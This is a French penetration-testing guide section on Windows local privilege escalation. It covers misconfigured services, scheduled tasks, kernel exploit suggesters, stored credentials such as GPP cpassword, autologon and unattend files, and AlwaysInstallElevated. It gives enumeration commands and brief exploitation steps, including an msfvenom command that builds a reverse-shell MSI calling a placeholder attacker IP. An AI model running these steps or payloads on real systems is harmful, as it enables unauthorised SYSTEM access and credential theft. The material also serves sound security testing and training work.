# V.E. Exploitation de Vulnérabilités Locales et de Mauvaises Configurations

Une fois un accès obtenu sur une machine, même avec des privilèges limités, il est possible d'élever les privilèges localement vers `NT AUTHORITY\SYSTEM` ou un administrateur local. Cela peut ensuite faciliter le mouvement latéral ou l'accès à des informations/credentials stockés localement.

Voir [IV.A Énumération Locale Approfondie](../04-post-compromission/A-enumeration-locale.md) pour les techniques d'identification.

## 1. Services Windows Mal Configurés

*   **Chemins de Service Non Quotés (Unquoted Service Paths) :**
    *   **Principe :** Si le chemin vers l'exécutable d'un service contient des espaces et n'est pas entre guillemets, Windows peut tenter d'exécuter un programme malveillant placé dans un répertoire parent. Ex: `C:\Program Files\Mon Service\service.exe`. Windows cherchera `C:\Program.exe`.
    *   **Identification :**
        ```powershell
        Get-CimInstance -ClassName win32_service | Select Name, DisplayName, PathName, StartMode, StartName | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like "* *"}
        # Vérifier les permissions d'écriture sur les dossiers concernés.
        # accesschk.exe -d "C:\Program Files\Mon Service\"
        ```
        Outils comme `WinPEAS`, `PowerUp.ps1` (`Get-UnquotedService`) peuvent automatiser cela.
    *   **Exploitation :** Placer un exécutable malveillant (ex: `Program.exe`) dans le chemin interprétable et redémarrer le service (si on a les droits ou si le service redémarre automatiquement).
*   **Permissions Faibles sur les Exécutables de Service ou les Clés de Registre :**
    *   **Principe :** Si un utilisateur peut modifier l'exécutable d'un service (qui tourne en tant que SYSTEM) ou sa configuration dans le registre (`ImagePath`), il peut remplacer l'exécutable par un malware.
    *   **Identification :**
        *   `accesschk.exe -uwcqv "Authenticated Users" *` (pour les services)
        *   `accesschk.exe -k "hklm\system\currentcontrolset\services"` (pour les clés de registre)
        *   PowerUp.ps1 : `Get-ModifiableServiceFile`, `Get-ModifiableServiceRegistry`
    *   **Exploitation :** Remplacer le binaire, modifier `ImagePath`, redémarrer le service.
*   **DLL Hijacking dans les Services :**
    *   **Principe :** Si un service (tournant en tant que SYSTEM) charge une DLL depuis un chemin où un utilisateur standard a des droits d'écriture, l'attaquant peut remplacer la DLL légitime par une DLL malveillante.
    *   **Identification :** Utiliser ProcMon (Sysinternals) pour observer les `NAME NOT FOUND` lors du chargement des DLLs par les services. Vérifier les permissions sur ces chemins.
    *   **Exploitation :** Placer la DLL malveillante, redémarrer le service.

## 2. Tâches Planifiées Mal Configurées

*   **Principe :** Si une tâche planifiée exécutée avec des privilèges élevés pointe vers un script/exécutable modifiable par un utilisateur standard.
*   **Identification :**
    ```powershell
    Get-ScheduledTask | ?{$_.Principal.UserId -eq "S-1-5-18" -or $_.Principal.LogonType -eq "Password"} | %{ $task = $_; $_.Actions | %{ Write-Host "Task: $($task.TaskName)"; Write-Host "Principal: $($task.Principal.UserId)"; Write-Host "Action: $($_.Execute)"; $path = $_.Execute.Trim('"'); if(Test-Path $path){ Get-Acl $path | Select Path, Owner, AccessToString } Else { Write-Warning "Path not found: $path" } } }
    # PowerUp.ps1: Get-ModifiableScheduledTaskFile
    ```
*   **Exploitation :** Remplacer le script/exécutable, attendre l'exécution de la tâche ou la déclencher si possible.

## 3. Vulnérabilités Kernel (Exploits Locaux)

*   **Principe :** Exploiter des failles dans le noyau Windows (CVEs) pour obtenir des privilèges SYSTEM.
*   **Identification :**
    *   Comparer la version du système et les patchs installés (`systeminfo`, `wmic qfe`) avec les bases de données de CVEs.
    *   Outils : `Sherlock.ps1`, `Watson.exe`, `Windows Exploit Suggester (wesng)`.
        ```bash
        # wesng
        # python wes.py --update
        # python wes.py systeminfo.txt
        ```
*   **Exploitation :** Utiliser des exploits publics (Metasploit, GitHub). **Attention :** Peut être instable et causer des plantages. Tester en environnement contrôlé.

## 4. Mots de Passe Stockés en Clair / Faiblement Protégés

*   **Fichiers de configuration, scripts, registre :** Voir [IV.A Énumération Locale Approfondie](../04-post-compromission/A-enumeration-locale.md#4-recherche-de-credentials-et-informations-sensibles).
*   **Group Policy Preferences (GPP) Passwords :**
    *   **Principe :** Anciennement, les GPOs permettaient de définir des mots de passe (ex: pour des admins locaux, des tâches planifiées) qui étaient stockés chiffrés avec une clé AES publique dans SYSVOL.
    *   **Identification :** Rechercher les fichiers `Groups.xml`, `ScheduledTasks.xml`, `Services.xml` dans SYSVOL.
        ```powershell
        # PowerSploit: Get-GPPPassword
        Get-GPPPassword
        ```
    *   **Exploitation :** Déchiffrer le champ `cpassword` avec la clé AES publique.
*   **Autologon Credentials :**
    *   Stockés dans `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.
    *   `DefaultUserName`, `DefaultPassword`.
*   **Unattend Files :**
    *   Fichiers XML (`unattend.xml`, `autounattend.xml`) utilisés pour l'installation automatisée de Windows, peuvent contenir des credentials d'admin local.
    *   Rechercher dans `C:\Windows\Panther`, `C:\Windows\System32\Sysprep`, etc.

## 5. AlwaysInstallElevated

*   **Principe :** Si les clés de registre `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` et `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` sont toutes les deux à `1`, les paquets MSI sont installés avec les privilèges SYSTEM, quel que soit l'utilisateur qui les lance.
*   **Identification :**
    ```powershell
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
*   **Exploitation :** Créer un paquet MSI malveillant (ex: avec `msfvenom`) et l'exécuter.
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=<PORT> -f msi -o evil.msi
    # Exécuter sur la cible :
    # msiexec /quiet /qn /i evil.msi
    ```

## 6. DLL Hijacking (Applications Utilisateur)
*   Similaire au DLL Hijacking pour les services, mais pour des applications lancées par l'utilisateur qui pourraient avoir des privilèges plus élevés ou charger des DLLs depuis des chemins inattendus.

**Outils d'Automatisation pour l'Élévation de Privilèges Locaux :**
*   **WinPEAS :** Script/exécutable complet pour l'énumération et la suggestion de vecteurs d'escalade.
*   **PowerUp.ps1 (PowerSploit) :** Contient de nombreuses fonctions pour trouver et abuser des mauvaises configurations.
*   **Seatbelt.exe :** Outil d'énumération axé sur la sécurité.
*   **JAWS (Just Another Windows Privilege Escalation Script).**

Toujours vérifier les résultats des outils automatisés et comprendre le vecteur d'exploitation avant de l'utiliser. 